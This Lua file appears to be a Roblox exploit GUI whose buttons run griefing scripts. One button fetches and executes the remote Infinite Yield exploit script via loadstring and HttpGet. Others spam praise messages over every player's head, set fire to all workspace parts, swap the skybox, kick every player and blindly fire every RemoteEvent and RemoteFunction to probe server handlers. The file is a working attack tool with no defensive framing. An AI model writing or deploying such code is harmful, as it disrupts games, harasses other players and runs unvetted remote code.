local function PZDS_script() -- IY.LocalScript 
	local script = Instance.new('LocalScript', IY)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
	end)
end
coroutine.wrap(PZDS_script)()
local function HLCS_script() -- call.LocalScript 
	local script = Instance.new('LocalScript', call)

	script.Parent.MouseButton1Click:Connect(function()
		game.TextChatService.BubbleChatConfiguration.MaxBubbles = 150
		game.TextChatService.BubbleChatConfiguration.BubbleDuration = 25
	
		for _, targetPlayer in ipairs(game.Players:GetPlayers()) do
			if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
				for i = 1, 1000 do
					game:GetService("Chat"):Chat(targetPlayer.Character.Head, "PRAISE " .. string.upper(game.Players.LocalPlayer.Name), Enum.ChatColor.White)
					wait(0.3)
				end
			end
		end
	end)
	
end
coroutine.wrap(HLCS_script)()
local function TICGUVB_script() -- fire.LocalScript 
	local script = Instance.new('LocalScript', fire)

	script.Parent.MouseButton1Click:Connect(function()
		for i,v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("Model") or v:IsA("Accessory") then
				local a = Instance.new("Fire")
				a.Parent = v
				a.Size = 25
				a.Heat = 100
				a.Name = "Suffer"
			end
		end
	end)
end
coroutine.wrap(TICGUVB_script)()
local function ELQXF_script() -- sky.LocalScript 
	local script = Instance.new('LocalScript', sky)

	local ID = 140538653833380
	script.Parent.MouseButton1Click:Connect(function()
		local skyFound = false
	
	
		for _, v in pairs(game.Lighting:GetChildren()) do
			if v:IsA("Sky") then
	
				v.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
				v.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
				v.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
				v.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
				v.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
				v.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID
				skyFound = true
				break
			end
		end
	
	
		if not skyFound then
			local a = Instance.new("Sky")
			a.Parent = game.Lighting
			a.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
			a.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
			a.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
			a.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
			a.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
			a.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID
		end
	end)
	
end
coroutine.wrap(ELQXF_script)()
local function MWTUSES_script() -- shutdown.LocalScript 
	local script = Instance.new('LocalScript', shutdown)

	local function kickAllPlayers()
		for _, player in pairs(game.Players:GetPlayers()) do
			player:Kick("Server Shutdown")
		end
	end
	
	script.Parent.MouseButton1Click:Connect(function()
		kickAllPlayers()
	end)
	
end
coroutine.wrap(MWTUSES_script)()
local function ZQXHWZT_script() -- schmart.LocalScript 
	local script = Instance.new('LocalScript', schmart)

	script.Parent.MouseButton1Click:Connect(function()
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
			if v:IsA("RemoteEvent") then
				pcall(function() 
					print("Fired RemoteEvent:", v:GetFullName())
					v:FireServer()
				end)
			elseif v:IsA("RemoteFunction") then
				pcall(function()  
					print("Fired RemoteFunction:", v:GetFullName())  
					v:InvokeServer() 
				end)
			elseif v:IsA("BindableEvent") then
				pcall(function()  
					print("Fired BindableEvent:", v:GetFullName())  
					v:Fire() 
				end)
			elseif v:IsA("BindableFunction") then
				pcall(function()  
					print("Fired BindableFunction:", v:GetFullName())  
					v:Invoke() 
				end)
			end
		end
	end)
	
end
coroutine.wrap(ZQXHWZT_script)()
